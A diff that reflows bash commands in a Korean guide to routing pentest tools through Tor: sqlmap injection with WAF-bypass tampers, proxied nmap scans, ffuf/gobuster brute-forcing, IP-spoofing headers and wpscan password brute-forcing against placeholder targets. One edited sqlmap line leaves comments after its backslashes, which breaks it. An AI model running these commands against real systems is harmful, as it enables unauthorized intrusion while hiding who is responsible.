@@ -144,12 +144,10 @@ torsocks curl -s https://check.torproject.org/api/ip
 nmap -Pn --proxy socks5://127.0.0.1:9050 -sT -p 80,443 target.com
 
 # sqlmap을 통한 SQL 인젝션 테스트
-sqlmap -u "http://target.com/vuln.php?id=1" \
-  --tor --tor-type=SOCKS5 --check-tor
+sqlmap -u "http://target.com/vuln.php?id=1" --tor --tor-type=SOCKS5 --check-tor
 
 # ffuf를 통한 디렉토리 브루트포싱
-torsocks ffuf -u http://target.com/FUZZ \
-  -w /usr/share/wordlists/dirb/common.txt
+torsocks ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
 
 # Metasploit 프록시 설정
 msf > setg Proxies socks5:127.0.0.1:9050
@@ -159,15 +157,10 @@ msf > setg Proxies socks5:127.0.0.1:9050
 
 ```bash
 # User-Agent 위조와 함께 요청
-torsocks curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
-  https://target.com
+torsocks curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://target.com
 
 # 다중 헤더를 통한 IP 우회 시도
-torsocks curl -i http://target.com/admin \
-  -H "X-Forwarded-For: 127.0.0.1" \
-  -H "X-Real-IP: 127.0.0.1" \
-  -H "Client-IP: 127.0.0.1" \
-  -H "X-Remote-IP: 127.0.0.1"
+torsocks curl -i http://target.com/admin -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -H "Client-IP: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1"
 ```
 
 ### 7. 핵심 용어 정리
@@ -355,16 +348,10 @@ socks4 127.0.0.1 1080    # 추가 SOCKS4 프록시
 
 ```bash
 # 기본 Tor 연동
-sqlmap -u "http://target.com/vuln.php?id=1" \
-  --tor --tor-type=SOCKS5 --check-tor
+sqlmap -u "http://target.com/vuln.php?id=1" --tor --tor-type=SOCKS5 --check-tor
 
 # 고급 옵션 조합
-sqlmap -u "http://target.com/login.php" \
-  --data="username=admin&password=123" \
-  --tor --tor-type=SOCKS5 --check-tor \
-  --random-agent --delay=2 --timeout=30 \
-  --threads=1 --technique=BEUSTQ \
-  -m text.txt
+sqlmap -u "http://target.com/login.php" --data="username=admin&password=123" --tor --tor-type=SOCKS5 --check-tor --random-agent --delay=2 --timeout=30 --threads=1 --technique=BEUSTQ -m text.txt
 
 ```
 
@@ -385,40 +372,22 @@ sqlmap -u "http://target.com/login.php" \
 
 ```bash
 # 고급 WAF 우회 + Tor
-sqlmap -u "http://target.com/search.php?q=test" \
-  --tor --tor-type=SOCKS5 --check-tor \
-  --tamper=space2comment,charencode,randomcase \
-  --random-agent --delay=3 --timeout=60 \
-  --headers="X-Forwarded-For:127.0.0.1" \
-  --headers="X-Real-IP:127.0.0.1" \
-  --technique=B --risk=3 --level=5
+sqlmap -u "http://target.com/search.php?q=test" --tor --tor-type=SOCKS5 --check-tor --tamper=space2comment,charencode,randomcase --random-agent --delay=3 --timeout=60 --headers="X-Forwarded-For:127.0.0.1" --headers="X-Real-IP:127.0.0.1" --technique=B --risk=3 --level=5
 
 
 # 일반 sqlmap
 sqlmap -u "http://example.com/page.php?id=1" --common-tables -t /path/to/SecLists/Discovery/Web-Content/common-tables.txt
 
 # tor + sqlmap
-sqlmap -u "http://example.com/page.php?id=1" \
-  --tor --tor-type=SOCKS5 --check-tor \
-  --common-tables \
-  -t /path/to/SecLists/Discovery/Web-Content/common-tables.txt \
-  --random-agent \
-  --delay=3 \
-  --timeout=15 \
-  --retries=3 \
-  --batch
+sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --check-tor --common-tables -t /path/to/SecLists/Discovery/Web-Content/common-tables.txt --random-agent --delay=3 --timeout=15 --retries=3 --batch
 
 # 랜덤 지연
 sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --delay=3 --time-sec=5 --randomize=length --safe-url="http://example.com/" --safe-freq=10
 
 
 # DBMS
-sqlmap -u "http://example.com/page.php?id=1" \
-  --tor --tor-type=SOCKS5 \
-  --dbms=mysql \  # 특정 DBMS 대상으로 최적화
-  --common-tables \
-  -t /path/to/SecLists/Discovery/Web-Content/MySQL.txt \
-  --level=5 \    # 테스트 레벨 증가 (더 철저한 검사)
+sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --dbms=mysql \  # 특정 DBMS 대상으로 최적화
+  --common-tables -t /path/to/SecLists/Discovery/Web-Content/MySQL.txt --level=5 \    # 테스트 레벨 증가 (더 철저한 검사)
   --risk=3 \     # 위험도 증가 (더 공격적인 테스트)
   --threads=2 \  # Tor 네트워크에서는 스레드 수를 낮게 유지
   --hex \        # 특수 문자를 HEX 인코딩
@@ -433,13 +402,10 @@ sqlmap -u "http://example.com/page.php?id=1" \
 
 ```bash
 # 기본 TCP 스캔
-nmap -Pn --proxy socks5://127.0.0.1:9050 \
-  -sT -p 80,443,8080,8443 target.com
+nmap -Pn --proxy socks5://127.0.0.1:9050 -sT -p 80,443,8080,8443 target.com
 
 # 상세 버전 스캔
-nmap -Pn --proxy socks5://127.0.0.1:9050 \
-  -sT -sV -p 1-1000 target.com \
-  --version-intensity 0 --script-timeout 60s
+nmap -Pn --proxy socks5://127.0.0.1:9050 -sT -sV -p 1-1000 target.com --version-intensity 0 --script-timeout 60s
 ```
 
 ##### 핵심 옵션 설명
@@ -455,16 +421,10 @@ nmap -Pn --proxy socks5://127.0.0.1:9050 \
 
 ```bash
 # HTTP 서비스 상세 분석
-nmap -Pn --proxy socks5://127.0.0.1:9050 \
-  -sT -p 80,443 target.com \
-  --script=http-enum,http-headers,http-methods \
-  --script-timeout 120s
+nmap -Pn --proxy socks5://127.0.0.1:9050 -sT -p 80,443 target.com --script=http-enum,http-headers,http-methods --script-timeout 120s
 
 # SSL/TLS 분석
-nmap -Pn --proxy socks5://127.0.0.1:9050 \
-  -sT -p 443 target.com \
-  --script=ssl-enum-ciphers,ssl-cert \
-  --script-timeout 180s
+nmap -Pn --proxy socks5://127.0.0.1:9050 -sT -p 443 target.com --script=ssl-enum-ciphers,ssl-cert --script-timeout 180s
 ```
 
 #### 🔍 curl - HTTP 요청 및 웹 테스트
@@ -476,38 +436,26 @@ nmap -Pn --proxy socks5://127.0.0.1:9050 \
 torsocks curl -i -L https://target.com/
 
 # POST 데이터 전송
-torsocks curl -i -X POST https://target.com/login \
-  -d "username=admin&password=123" \
-  -H "Content-Type: application/x-www-form-urlencoded"
+torsocks curl -i -X POST https://target.com/login -d "username=admin&password=123" -H "Content-Type: application/x-www-form-urlencoded"
 ```
 
 ##### 고급 헤더 조작 및 우회 기법
 
 ```bash
 # 다중 헤더로 IP 우회 시도
-torsocks curl -i https://target.com/admin/ \
-  -H "X-Forwarded-For: 127.0.0.1" \
-  -H "X-Real-IP: 127.0.0.1" \
-  -H "X-Remote-IP: 127.0.0.1" \
-  -H "X-Remote-Addr: 127.0.0.1" \
-  -H "X-Client-IP: 127.0.0.1" \
-  -H "X-Originating-IP: 127.0.0.1" \
-  -H "CF-Connecting-IP: 127.0.0.1" \
-  -H "True-Client-IP: 127.0.0.1"
+torsocks curl -i https://target.com/admin/ -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "CF-Connecting-IP: 127.0.0.1" -H "True-Client-IP: 127.0.0.1"
 ```
 
 ##### 세션 관리 및 쿠키 처리
 
 ```bash
 # 쿠키 저장/로드
-torsocks curl -i -c cookies.txt https://target.com/login \
-  -d "username=admin&password=123"
+torsocks curl -i -c cookies.txt https://target.com/login -d "username=admin&password=123"
 
 torsocks curl -i -b cookies.txt https://target.com/dashboard
 
 # 세션 유지 테스트
-torsocks curl -i -b cookies.txt https://target.com/sensitive \
-  -H "Referer: https://target.com/dashboard"
+torsocks curl -i -b cookies.txt https://target.com/sensitive -H "Referer: https://target.com/dashboard"
 ```
 
 #### 🔍 ffuf - 웹 디렉토리/파일 브루트포싱
@@ -516,31 +464,20 @@ torsocks curl -i -b cookies.txt https://target.com/sensitive \
 
 ```bash
 # 기본 디렉토리 브루트포싱
-torsocks ffuf -u http://target.com/FUZZ \
-  -w /usr/share/wordlists/dirb/common.txt \
-  -fs 1234 -fc 404 -t 10
+torsocks ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 1234 -fc 404 -t 10
 
 # 파일 확장자 브루트포싱
-torsocks ffuf -u http://target.com/FUZZ \
-  -w /usr/share/wordlists/dirb/common.txt \
-  -e .php,.html,.txt,.js,.json,.xml \
-  -fs 1234 -t 5
+torsocks ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.js,.json,.xml -fs 1234 -t 5
 ```
 
 ##### 매개변수 브루트포싱
 
 ```bash
 # GET 매개변수 발견
-torsocks ffuf -u "http://target.com/search.php?FUZZ=test" \
-  -w /usr/share/wordlists/burp-parameter-names.txt \
-  -fs 1234 -mc 200 -t 10
+torsocks ffuf -u "http://target.com/search.php?FUZZ=test" -w /usr/share/wordlists/burp-parameter-names.txt -fs 1234 -mc 200 -t 10
 
 # POST 매개변수 발견
-torsocks ffuf -u http://target.com/login.php \
-  -w /usr/share/wordlists/burp-parameter-names.txt \
-  -X POST -d "FUZZ=test" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -fs 1234 -t 5
+torsocks ffuf -u http://target.com/login.php -w /usr/share/wordlists/burp-parameter-names.txt -X POST -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded" -fs 1234 -t 5
 ```
 
 ##### 핵심 옵션 설명
@@ -556,14 +493,10 @@ torsocks ffuf -u http://target.com/login.php \
 
 ```bash
 # 기본 디렉토리 스캔
-torsocks gobuster dir -u http://target.com \
-  -w /usr/share/wordlists/dirb/common.txt \
-  -t 10 -q --delay 100ms
+torsocks gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 10 -q --delay 100ms
 
 # DNS 서브도메인 스캔
-torsocks gobuster dns -d target.com \
-  -w /usr/share/wordlists/subdomains-top1million-5000.txt \
-  -t 5 --delay 200ms
+torsocks gobuster dns -d target.com -w /usr/share/wordlists/subdomains-top1million-5000.txt -t 5 --delay 200ms
 ```
 
 #### 🔍 nikto - 웹 취약점 스캐너
@@ -573,22 +506,17 @@ torsocks gobuster dns -d target.com \
 torsocks nikto -h http://target.com -timeout 30
 
 # 상세 스캔 with 헤더 조작
-torsocks nikto -h http://target.com \
-  -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
-  -timeout 60 -Display V
+torsocks nikto -h http://target.com -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -timeout 60 -Display V
 ```
 
 #### 🔍 wpscan - WordPress 취약점 스캐너
 
 ```bash
 # WordPress 기본 스캔
-torsocks wpscan --url http://target.com \
-  --random-user-agent --detection-mode aggressive
+torsocks wpscan --url http://target.com --random-user-agent --detection-mode aggressive
 
 # 사용자 열거 + 패스워드 브루트포싱
-torsocks wpscan --url http://target.com \
-  --enumerate u --passwords /usr/share/wordlists/rockyou.txt \
-  --max-threads 5
+torsocks wpscan --url http://target.com --enumerate u --passwords /usr/share/wordlists/rockyou.txt --max-threads 5
 ```
 
 ### 6. 핵심 보안 옵션 및 설정
@@ -607,8 +535,7 @@ curl -x socks5://127.0.0.1:9050 https://target.com
 
 ```bash
 # Windows Chrome 위조
-torsocks curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
-  https://target.com
+torsocks curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" https://target.com
 
 # 랜덤 User-Agent 목록
 USER_AGENTS=(
@@ -690,9 +617,7 @@ torsocks curl -i -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "$TARGET"
 
 # 2단계: 디렉토리 스캔
 echo "[+] 디렉토리 스캔"
-torsocks ffuf -u "$TARGET/FUZZ" \
-  -w /usr/share/wordlists/dirb/common.txt \
-  -fs 1234 -t 5 -delay 200ms
+torsocks ffuf -u "$TARGET/FUZZ" -w /usr/share/wordlists/dirb/common.txt -fs 1234 -t 5 -delay 200ms
 
 # 3단계: 취약점 스캔
 echo "[+] Nikto 취약점 스캔"
@@ -700,9 +625,7 @@ torsocks nikto -h "$TARGET" -timeout 30
 
 # 4단계: SQL 인젝션 테스트
 echo "[+] SQL 인젝션 테스트"
-sqlmap -u "$TARGET/login.php" --forms \
-  --tor --tor-type=SOCKS5 --check-tor \
-  --random-agent --delay=2
+sqlmap -u "$TARGET/login.php" --forms --tor --tor-type=SOCKS5 --check-tor --random-agent --delay=2
 ```
 
 #### 🎯 시나리오 2: API 엔드포인트 테스트
@@ -712,15 +635,12 @@ sqlmap -u "$TARGET/login.php" --forms \
 API_BASE="https://api.target.com"
 
 # JWT 토큰 획득
-TOKEN=$(torsocks curl -s -X POST "$API_BASE/auth" \
-  -H "Content-Type: application/json" \
-  -d '{"username":"test","password":"test"}' | jq -r '.token')
+TOKEN=$(torsocks curl -s -X POST "$API_BASE/auth" -H "Content-Type: application/json" -d '{"username":"test","password":"test"}' | jq -r '.token')
 
 # API 엔드포인트 테스트
 for endpoint in users orders products; do
   echo "[+] Testing /$endpoint"
-  torsocks curl -s -H "Authorization: Bearer $TOKEN" \
-    "$API_BASE/$endpoint" | jq .
+  torsocks curl -s -H "Authorization: Bearer $TOKEN" "$API_BASE/$endpoint" | jq .
   sleep 2
 done
 ```
